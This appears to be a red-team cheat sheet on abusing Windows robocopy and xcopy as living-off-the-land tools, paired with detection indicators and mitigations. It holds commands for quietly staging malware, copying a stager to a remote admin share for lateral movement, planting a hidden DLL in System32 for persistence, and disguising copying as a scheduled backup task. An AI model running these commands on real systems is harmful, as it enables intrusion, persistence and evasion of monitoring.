# 📁 Robocopy & Xcopy - Living Off the Land

**robocopy.exe** and **xcopy.exe** are legitimate Windows file transfer tools used by sysadmins for backups and deployments. Attackers abuse them to **move payloads**, **stage lateral movement**, or **exfiltrate data quietly** — without using external tools.

> ⚠️ These tools are native, signed, and rarely logged — use in labs only for red team training.

---

## 🛠️ What They Do
- Copy files between directories and systems
- Support hidden/system attributes
- Bypass basic ACLs (Access Control Lists) when misconfigured
- Blend into legitimate backup/migration operations

---

## 💣 Common LotL Robocopy/Xcopy Techniques

### 1. Move Malware to Public Folder
```cmd
robocopy C:\Payloads C:\Users\Public\payloads malware.exe /NFL /NDL /NJH /NJS /nc /ns /np
```
✅ Quietly copies malware without verbose output

---

### 2. Replicate Entire Folder to Another Host
```cmd
xcopy /e /i /h /y C:\Stager \\target\C$\Users\Public\Stager
```
✅ Lateral movement technique — requires valid credentials and open shares

---

### 3. Transfer Files While Hiding Execution
```cmd
robocopy C:\Tools C:\Backup tool.exe /Z /NFL /NDL
```
✅ /Z flag enables restartable mode — good for evading detection tools

---

### 4. Weaponize File Attributes to Cloak Payloads
```cmd
xcopy /h /y C:\Trojan\stealth.dll C:\Windows\System32\stealth.dll
attrib +h +s C:\Windows\System32\stealth.dll
```
✅ Uses `xcopy` + `attrib` for stealth persistence

---

### 5. Use in Scheduled Task for File Sync
```cmd
schtasks /create /tn "Updater" /tr "robocopy C:\Temp C:\Backup /MIR" /sc hourly /f
```
✅ Mimics backup job — can be used to move staged tools or logs

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| Robocopy to/from `Public`, `Temp`, `System32` | High risk — monitor source + dest paths |
| Xcopy across network shares | Flag unusual inter-host traffic with `/e`, `/h`, `/y` flags |
| Obfuscated use in scheduled tasks | Look for robocopy in task XML or command line

---

## 🔐 Mitigation Strategies
- Monitor file transfers between sensitive paths (e.g., `System32`, `Users\Public`)
- Restrict share access and enforce SMB hardening
- Audit use of robocopy/xcopy from user sessions
- Detect file copy operations outside backup windows

---

> 🧠 These tools are native and trusted. Use them for stealthy file movement, lateral staging, or evasion chains — and learn to hunt them before someone else does.
